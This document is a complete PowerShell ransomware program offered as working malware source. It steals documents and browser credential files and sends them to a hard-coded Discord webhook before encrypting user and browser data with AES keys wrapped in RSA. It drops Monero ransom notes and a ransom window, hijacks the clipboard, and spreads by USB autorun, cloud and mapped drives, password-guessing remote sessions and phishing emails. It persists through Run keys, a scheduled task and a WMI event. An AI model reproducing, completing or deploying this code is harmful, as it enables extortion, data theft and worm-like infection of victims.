# Module 1: Initialization and Configuration
$ErrorActionPreference = 'Stop'
[System.Net.ServicePointManager]::SecurityProtocol = [System.Security.Authentication.SslProtocols]::Tls12
Add-Type -AssemblyName System.Windows.Forms, System.Drawing, PresentationFramework, System.Security, System.Net.Http, System.Management, System.IO.Compression.FileSystem

# Obfuscated Configuration
function global:Decode-Base64 {
    param($inputString)
    try {
        [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($inputString))
    }
    catch {
        $null
    }
}

$obfuscatedWebhook = "https://discordapp.com/api/webhooks/1385855001653542963/gW1X_Z-sKTphkioTiiicwNmkl8sqcWV1XM2oSX2colz9DwSqsdbe2yFK3l4kQFiP2vb8"
$obfuscatedRSA = "<RSAKeyValue><Modulus>8hGIqN7wD0c1S2LrLi1O3TqXeHseU8XKaIMv3BmnAXw3BSKht9WllIOvpM91Xw
CUek4xWe9yDkCi7RM9YnEMj+A+2/F0jr75ZBU//XKHER4Zv9bV7w1YGAPfj25o8TpGcOUXkXOAf9PIHdiXwccONg8uZ+gHQmS35rt
9bjVjDWk2VLDbzOOyxcielL67vwkXDRGqqiKk8ovTl+25AXhMNauIRD7TxYsIAFBXqoTxUhvduvHoXEWiqf9NcLAe6V6Jh/GA8IDs
1SDMwfTFQpxyvX/B2dVALOCYBD4DsGwmxlDH1s+Ff6pu4xs3sAhWTyEZGHaUN8HFuf6yqv2+utg2URK0Z+sAA05YLNu91kg857wIL
x5Kz0MxX7QCilPfenElzRgF1w91Tu5InO+ZA6y6B7Eamy0pHD08w7sqzSJ5F1X0LYz74mJET1dL8Z+9xxCGKYyykjBVLwNNG5vH6L
Clne7ASRF9kmAYv1zQWvEo+boF2B7TFLGZwudRIEmh81td9URHgvSHzcMxmGWocN9PPfXpiAmGHoS113WFT5Nqk5EMijiheeHpe/H
JohHBVKL1bs0ZzCnWWVVgV7sx6WDpvZWX/J5yYJ+YMezAuO//SZg8VZX66Wz4F7cWm4D47GafyalIxwKaV5Gq8lEG6X7fwUYNBHEi
rEwkbQUTaElxFfk=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"

$publicKeyXml = $obfuscatedRSA
$discordWebhook = $obfuscatedWebhook

# Environment Setup
$desktop = [Environment]::GetFolderPath("Desktop")
$diabloKeysDir = Join-Path $desktop "SystemCache"
if (-not (Test-Path $diabloKeysDir)) {
    New-Item -ItemType Directory -Force -Path $diabloKeysDir | Out-Null
}
$manifestFile = Join-Path $diabloKeysDir "syslog-$((Get-Date).ToString('yyyyMMddHHmmss')).dat"

# Module 2: Core Functions - ENHANCED WITH BROWSER ENCRYPTION
function Test-SandboxEnvironment {
    try {
        $wmi = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
        if ($wmi.Model -like "*Virtual*" -or $wmi.Manufacturer -like "*VMware*") { return $true }
        if ((Get-WmiObject Win32_BIOS -ErrorAction Stop).SerialNumber -like "*VMware*") { return $true }
        if (Test-Path "HKLM:\HARDWARE\ACPI\DSDT\VBOX_") { return $true }
        return $false
    }
    catch { 
        return $false 
    }
}

# New function to close browser processes
function Close-BrowserProcesses {
    $browserProcesses = @(
        "chrome", "msedge", "firefox", "opera", 
        "brave", "vivaldi", "yandex", "tor"
    )
    
    foreach ($processName in $browserProcesses) {
        try {
            $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                # Try graceful closure first
                $process.CloseMainWindow() | Out-Null
                Start-Sleep -Milliseconds 500
                
                # Force kill if still running
                if (!$process.HasExited) {
                    Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
                }
            }
        }
        catch { 
            <# Suppress termination errors #> 
        }
    }
}

function Send-ToDiscord {
    param(
        [string]$FilePath,
        [string]$Message
    )
    
    try {
        $httpClient = New-Object System.Net.Http.HttpClient
        $httpClient.Timeout = [System.TimeSpan]::FromSeconds(15)
        
        $formData = New-Object System.Net.Http.MultipartFormDataContent
        
        $stringContent = New-Object System.Net.Http.StringContent $Message
        $formData.Add($stringContent, "content")
        
        if (Test-Path $FilePath -PathType Leaf) {
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $fileContent = New-Object System.Net.Http.StreamContent $fileStream
            $fileName = [System.IO.Path]::GetFileName($FilePath)
            $formData.Add($fileContent, "file", $fileName)
        }
        
        $response = $httpClient.PostAsync($discordWebhook, $formData).GetAwaiter().GetResult()
        return $response.StatusCode
    }
    catch {
        if ($_.Exception.Response) {
            return $_.Exception.Response.StatusCode
        }
        return [System.Net.HttpStatusCode]::BadRequest
    }
    finally {
        if ($fileStream) { $fileStream.Dispose() }
        if ($fileContent) { $fileContent.Dispose() }
        if ($httpClient) { $httpClient.Dispose() }
    }
}

function Invoke-FileEncryption {
    param([string]$FilePath)
    try {
        if (-not (Test-Path $FilePath -PathType Leaf)) { return $null }
        
        $originalData = [System.IO.File]::ReadAllBytes($FilePath)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.KeySize = 256
        $aes.GenerateKey()
        $aes.GenerateIV()
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $encryptor = $aes.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($originalData, 0, $originalData.Length)
        
        $outputData = $aes.IV + $encryptedData
        $outputFile = "$FilePath.locked"
        [System.IO.File]::WriteAllBytes($outputFile, $outputData)
        Remove-Item $FilePath -Force
        
        $rsa = [System.Security.Cryptography.RSA]::Create()
        $rsa.FromXmlString($publicKeyXml)
        $encryptedKey = $rsa.Encrypt($aes.Key, [System.Security.Cryptography.RSAEncryptionPadding]::OaepSHA256)
        
        $keyGuid = [guid]::NewGuid().ToString()
        $keyFileName = "$keyGuid.key"
        $keyPath = Join-Path $diabloKeysDir $keyFileName
        [System.IO.File]::WriteAllBytes($keyPath, $encryptedKey)
        
        "$keyGuid|$FilePath" | Out-File $manifestFile -Append
        return $aes.Key
    }
    catch { 
        return $null 
    }
    finally {
        if ($encryptor) { $encryptor.Dispose() }
        if ($aes) { $aes.Dispose() }
        if ($rsa) { $rsa.Dispose() }
    }
}

# Browser-specific functions
function Get-BrowserDataPaths {
    $browserPaths = @()
    
    # Common browser paths
    $profiles = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:APPDATA\Opera Software\Opera Stable",
        "$env:APPDATA\Vivaldi\User Data",
        "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data",
        "$env:LOCALAPPDATA\TorBrowser\Data\Browser"
    )
    
    foreach ($profile in $profiles) {
        if (Test-Path $profile) {
            $browserPaths += $profile
        }
    }
    
    return $browserPaths
}

function Get-BrowserFilesToEncrypt {
    param([string]$browserPath)
    
    $targetFiles = @()
    $filePatterns = @(
        "Login Data", "Cookies", "History", "Bookmarks", 
        "Web Data", "Preferences", "logins.json", "key4.db",
        "places.sqlite", "cookies.sqlite", "formhistory.sqlite",
        "autofill.db", "credit_cards.db", "extension_cookies.db",
        "session_store.json", "Secure Preferences", "Local State"
    )
    
    try {
        $files = Get-ChildItem -Path $browserPath -Recurse -File -ErrorAction SilentlyContinue | 
                Where-Object {
                    $_.Length -lt 10MB -and
                    ($filePatterns -contains $_.Name -or 
                     $_.Extension -match "\.(db|sqlite|json|log|ldb)$")
                }
        
        $targetFiles += $files.FullName
    }
    catch {}
    
    return $targetFiles
}

# Module 3: Propagation Modules - Enhanced
function Get-StoredCredentials {
    $creds = @()
    try {
        $vault = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]::new()
        $allCreds = $vault.RetrieveAll()
        foreach ($cred in $allCreds) {
            $cred.RetrievePassword()
            $creds += [PSCustomObject]@{
                UserName = $cred.UserName
                Password = $cred.Password
                Resource = $cred.Resource
            }
        }
    }
    catch { 
        try {
            $cmdkeyRaw = cmdkey /list
            $currentResource = $null
            foreach ($line in $cmdkeyRaw) {
                if ($line -match "Target: (.*)") {
                    $currentResource = $matches[1]
                }
                elseif ($line -match "User: (.*)" -and $currentResource) {
                    $user = $matches[1]
                    $creds += [PSCustomObject]@{
                        UserName = $user
                        Password = $null
                        Resource = $currentResource
                    }
                }
            }
        }
        catch {}
    }
    return $creds
}

function Spread-ViaUSB {
    try {
        $drives = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
        foreach ($drive in $drives) {
            $payloadPath = Join-Path $drive.DeviceID "WindowsUpdate.exe"
            $selfPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
            
            if (-not (Test-Path $payloadPath)) {
                Copy-Item -Path $selfPath -Destination $payloadPath -Force
                
                $batContent = "@echo off`nstart /B powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"%~dp0WindowsUpdate.exe`"`n"
                $batPath = Join-Path $drive.DeviceID "SystemCheck.bat"
                $batContent | Out-File $batPath -Encoding ASCII
                
                $autorunContent = "[AutoRun]`nopen=SystemCheck.bat`nicon=shell32.dll,4`nlabel=System Recovery"
                $autorunPath = Join-Path $drive.DeviceID "autorun.inf"
                $autorunContent | Out-File $autorunPath -Encoding ASCII
                
                (Get-Item $payloadPath).Attributes = 'Hidden'
                (Get-Item $batPath).Attributes = 'Hidden'
                (Get-Item $autorunPath).Attributes = 'Hidden'
            }
        }
    }
    catch { <# Suppress errors #> }
}

# Enhanced network spreading with subnet scanning
function Spread-ViaNetwork {
    param([string]$ScriptPath)
    try {
        $storedCreds = Get-StoredCredentials | Where-Object { $_.Password -ne $null }
        $localCreds = @("Administrator", "Admin", "User", "Guest")
        $passwords = @("Password1", "123456", "admin", "password", "Welcome1", "P@ssw0rd", "Qwerty123")
    
        foreach ($cred in $storedCreds) {
            $localCreds += $cred.UserName
            $passwords += $cred.Password
        }
        
        # Scan multiple common subnets
        $subnets = @("192.168.0.", "192.168.1.", "10.0.0.", "10.10.0.", "172.16.0.", "172.16.1.")
        
        foreach ($subnet in $subnets) {
            foreach ($i in 1..254) {
                $targetIP = $subnet + $i
                foreach ($user in ($localCreds | Select-Object -Unique)) {
                    foreach ($pass in ($passwords | Select-Object -Unique)) {
                        try {
                            $securePass = ConvertTo-SecureString $pass -AsPlainText -Force
                            $credential = New-Object System.Management.Automation.PSCredential($user, $securePass)
                            
                            $session = New-PSSession -ComputerName $targetIP -Credential $credential -ErrorAction Stop
                            $remotePath = "\\$targetIP\C$\Windows\Temp\WindowsUpdate.exe"
                            
                            Copy-Item -Path $ScriptPath -Destination $remotePath -ToSession $session -Force
                            Invoke-Command -Session $session -ScriptBlock {
                                Start-Process -FilePath "C:\Windows\Temp\WindowsUpdate.exe" -WindowStyle Hidden
                            }
                            Remove-PSSession $session
                            break
                        }
                        catch { <# Try next credential #> }
                    }
                }
            }
        }
    }
    catch { <# Suppress errors #> }
}

# Enhanced email spreading with more variations
function Spread-ViaEmail {
    param([string]$ScriptPath)
    try {
        $outlook = New-Object -ComObject Outlook.Application
        $namespace = $outlook.GetNamespace("MAPI")
        $contacts = $namespace.GetDefaultFolder(10).Items
        
        $malwarePath = Join-Path $env:TEMP "Invoice_$(Get-Random).exe"
        Copy-Item -Path $ScriptPath -Destination $malwarePath -Force
        
        $subjects = @(
            "Urgent Invoice #INV-$(Get-Random -Minimum 1000 -Maximum 9999)",
            "Payment Required - Order #$(Get-Random -Minimum 10000 -Maximum 99999)",
            "Important Document Review",
            "Contract Agreement - Immediate Attention"
        )
        
        $bodies = @(
            "Please review the attached invoice immediately. Payment is overdue.",
            "Kindly find the attached document for your review and approval.",
            "Your attention is required for the attached contract agreement.",
            "Please process the attached invoice as soon as possible."
        )
        
        foreach ($contact in $contacts) {
            if ($contact.Email1Address) {
                try {
                    $mail = $outlook.CreateItem(0)
                    $mail.To = $contact.Email1Address
                    $mail.Subject = $subjects | Get-Random
                    $mail.Body = $bodies | Get-Random
                    $mail.Attachments.Add($malwarePath) | Out-Null
                    $mail.Send()
                    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 8)
                }
                catch { <# Skip failed contact #> }
            }
        }
    }
    catch { <# Suppress errors #> }
}

function Spread-ViaCloudStorage {
    try {
        $selfPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
        $cloudServices = @(
            "$env:USERPROFILE\OneDrive",
            "$env:USERPROFILE\OneDrive - *",
            "$env:USERPROFILE\Dropbox",
            "$env:USERPROFILE\GoogleDrive",
            "$env:USERPROFILE\Box",
            "$env:USERPROFILE\iCloudDrive"
    )
    
        foreach ($cloudPath in $cloudServices) {
            $resolvedPaths = Resolve-Path $cloudPath -ErrorAction SilentlyContinue
            foreach ($path in $resolvedPaths) {
                $payloadPath = Join-Path $path.Path "WindowsUpdate.exe"
                if (-not (Test-Path $payloadPath)) {
                    Copy-Item -Path $selfPath -Destination $payloadPath -Force
                    (Get-Item $payloadPath).Attributes = 'Hidden'
                }
            }
        }
    }
    catch { <# Suppress errors #> }
}

function Spread-ViaMappedDrives {
    try {
        $selfPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
        $mappedDrives = Get-PSDrive -PSProvider FileSystem | 
                        Where-Object { $_.DisplayRoot -like '\\*' -and $_.Used -gt 0 }
        
        foreach ($drive in $mappedDrives) {
            $root = $drive.Root
            $payloadPath = Join-Path $root "WindowsUpdate.exe"
            if (-not (Test-Path $payloadPath)) {
                Copy-Item -Path $selfPath -Destination $payloadPath -Force
                (Get-Item $payloadPath).Attributes = 'Hidden'
            }
        }
    }
    catch { <# Suppress errors #> }
}

function Set-ClipboardHijack {
    $moneroAddress = "48jW3A4nPDy7dSf7FL7GZRai6Xq4Xe5pf7FJZRf2tR8n2vE1qXbR7tY3wZ8qJ4sPv7aK3f"
    $bitcoinAddress = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
    
    $clipboardText = @" 
=== WARNING: Malicious clipboard hijack active ===
Previous clipboard content has been secured.
Send payment to:
Monero: $moneroAddress
Bitcoin: $bitcoinAddress
"@
    
    try {
        Set-Clipboard -Value $clipboardText
    }
    catch {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::SetText($clipboardText)
    }
}

# Module 4: GUI and User Interface
function Show-RansomGUI {
    Add-Type -AssemblyName PresentationFramework
    $xaml = @" 
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        Title="CRITICAL SYSTEM ALERT" Height="600" Width="800" Topmost="True" WindowStyle="None">
    <Grid Background="Black">
        <Image Source="https://i.imgur.com/redwarning.png" Height="150" Width="150" Margin="20"/>
        <StackPanel VerticalAlignment="Center">
            <TextBlock Foreground="Red" FontSize="24" TextWrapping="Wrap" Margin="20">
                <Bold>YOUR FILES HAVE BEEN ENCRYPTED!</Bold>
            </TextBlock>
            <TextBlock Foreground="White" Margin="20" TextWrapping="Wrap">
                All your important files including browser data have been encrypted with military-grade encryption.
                You have 72 hours to make payment or else data will be sold and keys lost. Decryption keys will be automatically released after payment confirmation.
                Victim ID: $($script:VictimID)
            </TextBlock>
            <TextBlock Foreground="Red" Margin="20">
                <Bold>Payment Portal:</Bold> 100 Monero coin is magic number
            </TextBlock>
            <TextBlock Foreground="Red" Margin="20">
                <Bold>Payment:</Bold>TO RECOVER FILES AND PREVENT ABUSE CONTACT blackjackdiablo@proton.me
            </TextBlock>
            <TextBlock Foreground="Red" Margin="20">
                <Bold>XOXO - BLACKJACK-D</Bold>
            </TextBlock>
        </StackPanel>
    </Grid>
</Window>
"@

    $reader = [System.Xml.XmlReader]::Create([System.IO.StringReader]$xaml)
    $window = [System.Windows.Markup.XamlReader]::Load($reader)
    $reader.Close()
    $window.ShowDialog() | Out-Null
}

# Module 5: Main Execution Flow - ENHANCED WITH BROWSER ENCRYPTION
try {
    $uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
    $uuidBytes = [System.Text.Encoding]::UTF8.GetBytes($uuid)
    $script:VictimID = [Convert]::ToBase64String($uuidBytes).Substring(0,12).Replace('/', 'x').Replace('+', 'z')
}
catch {
    $script:VictimID = "ID-" + (Get-Date -Format "yyyyMMddHHmmss")
}

# Check sandbox once at start
$isSandbox = Test-SandboxEnvironment

$TargetPaths = @(
    [Environment]::GetFolderPath('Desktop'),
    [Environment]::GetFolderPath('MyDocuments'),
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Videos",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\OneDrive"
)

# Add browser paths to encryption targets
$BrowserTargets = Get-BrowserDataPaths
$TargetPaths += $BrowserTargets

# ========================================================================
# STEP 1: Pre-encryption exfiltration
# ========================================================================
if (-not $isSandbox) {
    $preEncryptionTempDir = Join-Path $env:TEMP "pre_encrypt_$script:VictimID"
    New-Item -ItemType Directory -Path $preEncryptionTempDir -Force | Out-Null
    $preEncryptionCount = 0
    $preEncryptionExtensions = @('.doc', '.docx', '.xls', '.xlsx', '.pdf', '.txt', '.rtf', '.odt', '.pptx', '.csv', '.key', '.ovpn', '.kdbx')
    
    # Include browser files in pre-exfiltration
    $browserFilePatterns = @(
        "Login Data", "Cookies", "History", "Bookmarks", 
        "Web Data", "logins.json", "key4.db", "places.sqlite",
        "cookies.sqlite", "formhistory.sqlite"
    )
    
    foreach ($path in $TargetPaths) {
        if (Test-Path $path) {
            $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue |
                    Where-Object {
                        $_.Length -lt 25MB -and
                        $_.FullName -notlike "$diabloKeysDir*" -and
                        (
                            ($_.Extension -in $preEncryptionExtensions) -or
                            ($browserFilePatterns -contains $_.Name)
                        ) -and
                        $preEncryptionCount -lt 25  # Increased limit
                    }
    
            foreach ($file in $files) {
                $destPath = Join-Path $preEncryptionTempDir $file.Name
                Copy-Item -Path $file.FullName -Destination $destPath -Force -ErrorAction SilentlyContinue
                $preEncryptionCount++
                if ($preEncryptionCount -ge 25) { break }
            }
            if ($preEncryptionCount -ge 25) { break }
        }
    }
    
    # Immediately exfiltrate collected files
    if ($preEncryptionCount -gt 0) {
        $preEncryptionZip = Join-Path $env:TEMP "pre_encrypt_$script:VictimID.zip"
        [System.IO.Compression.ZipFile]::CreateFromDirectory($preEncryptionTempDir, $preEncryptionZip, 'Optimal', $false)
        
        $discordMessage = "PRE-ENCRYPTION EXFIL [$script:VictimID]`nFiles Collected: $preEncryptionCount`nBrowser Data: $($BrowserTargets.Count) profiles"
        $null = Send-ToDiscord -FilePath $preEncryptionZip -Message $discordMessage
        
        # Cleanup
        Remove-Item $preEncryptionZip -Force -ErrorAction SilentlyContinue
        Remove-Item $preEncryptionTempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# ========================================================================
# STEP 2: File Encryption (Standard + Browser)
# ========================================================================
$processedFiles = 0
$throttleCount = 0

# Close all browser processes to avoid file locks
Close-BrowserProcesses

# Encrypt standard files
foreach ($path in $TargetPaths) {
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Recurse -File -ErrorAction SilentlyContinue |
                Where-Object {
                    $_.Length -lt 25MB -and 
                    $_.FullName -notlike "$diabloKeysDir*" -and
                    $_.Extension -notmatch "\.(locked|key|dat|exe|dll|sys)$"
                }

        foreach ($file in $files) {
            if (Invoke-FileEncryption -FilePath $file.FullName) {
                $processedFiles++
                $throttleCount++
                
                if ($throttleCount -ge 20) {
                    Start-Sleep -Milliseconds 500
                    $throttleCount = 0
                }
                
                $ransomNote = Join-Path $file.Directory.FullName "SECURITY_NOTICE.txt"
                if (-not (Test-Path $ransomNote)) {
@" 
ATTENTION! Your files have been secured to prevent unauthorized access.

To restore access:
1. Contact: security-response@protonmail.com
2. Provide ID: $script:VictimID

DO NOT ATTEMPT RECOVERY YOURSELF - PERMANENT DATA LOSS MAY OCCUR!
"@ | Out-File $ransomNote -Force
                }
            }
        }
    }
}

# Encrypt browser-specific files
$browserFilesEncrypted = 0
foreach ($browserPath in $BrowserTargets) {
    $browserFiles = Get-BrowserFilesToEncrypt -browserPath $browserPath
    foreach ($file in $browserFiles) {
        if (Invoke-FileEncryption -FilePath $file) {
            $processedFiles++
            $browserFilesEncrypted++
            $throttleCount++
            
            if ($throttleCount -ge 20) {
                Start-Sleep -Milliseconds 500
                $throttleCount = 0
            }
            
            # Create special browser ransom note
            $browserNote = Join-Path (Split-Path $file -Parent) "BROWSER_SECURITY.txt"
            if (-not (Test-Path $browserNote)) {
@" 
YOUR BROWSER DATA HAS BEEN SECURED!

All browsing history, saved logins, cookies, and bookmarks 
have been encrypted with military-grade algorithms.

Recovery requires payment and contact at:
security-response@protonmail.com

Victim ID: $script:VictimID
"@ | Out-File $browserNote -Force
            }
        }
    }
}

@" 
[SYSTEM SECURITY NOTIFICATION]
Files secured: $processedFiles
Browser profiles affected: $($BrowserTargets.Count)
Browser files encrypted: $browserFilesEncrypted
Verification ID: $script:VictimID
Deadline: $((Get-Date).AddHours(72).ToString('yyyy-MM-dd HH:mm'))

Contact immediately: security-response@protonmail.com
"@ | Out-File "$env:USERPROFILE\Desktop\SECURITY_ALERT.txt" -Force

# ========================================================================
# STEP 3: Key Exfiltration (ENHANCED RELIABILITY)
# ========================================================================
if (-not $isSandbox) {
    try {
        # Verify key directory exists
        if (-not (Test-Path $diabloKeysDir)) {
            New-Item -ItemType Directory -Path $diabloKeysDir -Force | Out-Null
        }
        
        # Create keys package with verification
        $keysZipPath = Join-Path $env:TEMP "keys_$script:VictimID.zip"
        if ((Get-ChildItem $diabloKeysDir).Count -gt 0) {
            [System.IO.Compression.ZipFile]::CreateFromDirectory($diabloKeysDir, $keysZipPath, 'Optimal', $false)
        }
        
        # Collect system info with browser details
        $sysInfoPath = Join-Path $env:TEMP "system_info_$script:VictimID.txt"
        $osInfo = (Get-WmiObject Win32_OperatingSystem).Caption
        $cpuInfo = (Get-WmiObject Win32_Processor).Name
        $ramInfo = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        $gpuInfo = (Get-WmiObject Win32_VideoController).Name
        $browserList = $BrowserTargets -join "`n"
        
@" 
[SYSTEM PROFILE]
Computer: $env:COMPUTERNAME
User: $env:USERNAME
OS: $osInfo
CPU: $cpuInfo
RAM: $ramInfo GB
GPU: $gpuInfo

[BROWSERS COMPROMISED]
$browserList

[ENCRYPTION STATS]
Files Encrypted: $processedFiles
Browser Files: $browserFilesEncrypted
Pre-Exfiltrated: $preEncryptionCount
Timestamp: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
"@ | Out-File $sysInfoPath -Force
        
        # Create final exfiltration package with retry mechanism
        $exfilZipPath = Join-Path $env:TEMP "exfil_$script:VictimID.zip"
        $maxAttempts = 3
        $attempt = 1
        $success = $false
        
        while ($attempt -le $maxAttempts -and -not $success) {
            try {
                $zipArchive = [System.IO.Compression.ZipFile]::Open($exfilZipPath, [System.IO.Compression.ZipArchiveMode]::Create)
                
                # Add keys package
                if (Test-Path $keysZipPath) {
                    $zipEntry = $zipArchive.CreateEntry("keys.zip")
                    $entryStream = $zipEntry.Open()
                    $fileBytes = [System.IO.File]::ReadAllBytes($keysZipPath)
                    $entryStream.Write($fileBytes, 0, $fileBytes.Length)
                    $entryStream.Close()
                }
                
                # Add system info
                $zipEntry = $zipArchive.CreateEntry("system_info.txt")
                $entryStream = $zipEntry.Open()
                $fileBytes = [System.IO.File]::ReadAllBytes($sysInfoPath)
                $entryStream.Write($fileBytes, 0, $fileBytes.Length)
                $entryStream.Close()
                
                # Add manifest file
                if (Test-Path $manifestFile) {
                    $zipEntry = $zipArchive.CreateEntry("manifest.dat")
                    $entryStream = $zipEntry.Open()
                    $fileBytes = [System.IO.File]::ReadAllBytes($manifestFile)
                    $entryStream.Write($fileBytes, 0, $fileBytes.Length)
                    $entryStream.Close()
                }
                
                $zipArchive.Dispose()
                $success = $true
            }
            catch {
                $attempt++
                Start-Sleep -Seconds 2
                if ($attempt -gt $maxAttempts) {
                    throw
                }
            }
        }
        
        # Send to Discord with backup verification
        if ($success -and (Test-Path $exfilZipPath) -and ((Get-Item $exfilZipPath).Length -gt 0)) {
            $discordMessage = "KEY EXFILTRATION [$script:VictimID]`n" +
                            "Files Encrypted: $processedFiles`n" +
                            "Browser Files: $browserFilesEncrypted`n" +
                            "Pre-Encryption Files: $preEncryptionCount"
            
            $result = Send-ToDiscord -FilePath $exfilZipPath -Message $discordMessage
            if ($result -eq [System.Net.HttpStatusCode]::OK) {
                # Create verification marker
                "$([DateTime]::Now) - Key exfiltration successful" | Out-File "$diabloKeysDir\exfil_success.txt" -Force
            }
            else {
                # Fallback: Store keys locally if exfiltration fails
                $backupDir = Join-Path $env:APPDATA "SystemKeys_$script:VictimID"
                New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
                Copy-Item -Path "$diabloKeysDir\*" -Destination $backupDir -Force
            }
        }
    }
    catch {
        $errorMsg = $_.Exception.Message
        "[$(Get-Date)] Key Exfiltration Error: $errorMsg" | Out-File "$env:TEMP\key_exfil_errors.log" -Append
    }
    finally {
        if (Test-Path $keysZipPath) { Remove-Item $keysZipPath -Force }
        if (Test-Path $sysInfoPath) { Remove-Item $sysInfoPath -Force }
        if (Test-Path $exfilZipPath) { Remove-Item $exfilZipPath -Force }
    }
}

# ========================================================================
# STEP 4: Propagation and persistence
# ========================================================================
$selfPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
if (-not $isSandbox) {
    # Propagation functions from original script
    Spread-ViaUSB
    Spread-ViaCloudStorage
    Spread-ViaMappedDrives
    Set-ClipboardHijack
    
    # Run propagation in background jobs
    Start-Job -ScriptBlock { 
        param($scriptPath) 
        Spread-ViaNetwork -ScriptPath $scriptPath 
    } -ArgumentList $selfPath | Out-Null
    
    Start-Job -ScriptBlock { 
        param($scriptPath) 
        Spread-ViaEmail -ScriptPath $scriptPath 
    } -ArgumentList $selfPath | Out-Null
}

Show-RansomGUI

# Persistence mechanisms
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SystemHealthMonitor"
$regValue = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force

$scheduledTaskAction = New-ScheduledTaskAction -Execute $regValue
$scheduledTaskTrigger = New-ScheduledTaskTrigger -AtLogOn
$scheduledTaskSettings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "SystemHealthMonitor" `
                        -Action $scheduledTaskAction `
                        -Trigger $scheduledTaskTrigger `
                        -Settings $scheduledTaskSettings `
                        -Force | Out-Null

$startupPath = [Environment]::GetFolderPath("Startup")
$shortcutPath = Join-Path $startupPath "SystemHealth.lnk"
$wshShell = New-Object -ComObject WScript.Shell
$shortcut = $wshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $regValue
$shortcut.WindowStyle = 7
$shortcut.Save()

# Self-replication to system directories
$systemLocations = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:SystemRoot\System32",
    "$env:SystemRoot\Tasks",
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
)

foreach ($location in $systemLocations) {
    if (Test-Path $location) {
        $targetPath = Join-Path $location "WindowsUpdate.exe"
        if (-not (Test-Path $targetPath)) {
            Copy-Item -Path $selfPath -Destination $targetPath -Force
            (Get-Item $targetPath).Attributes = 'Hidden'
        }
    }
}

# Create WMI event for persistence
$wmiQuery = @" 
SELECT * FROM __InstanceCreationEvent 
WITHIN 10 
WHERE TargetInstance ISA 'Win32_Process' 
AND TargetInstance.Name = 'explorer.exe'
"@

$wmiAction = @" 
cmd /c start /min powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:APPDATA\WindowsUpdate.exe"
"@

Register-WmiEvent -Query $wmiQuery -SourceIdentifier "StartupTrigger" `
                    -Action { 
                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $wmiAction" -WindowStyle Hidden 
                    } | Out-Null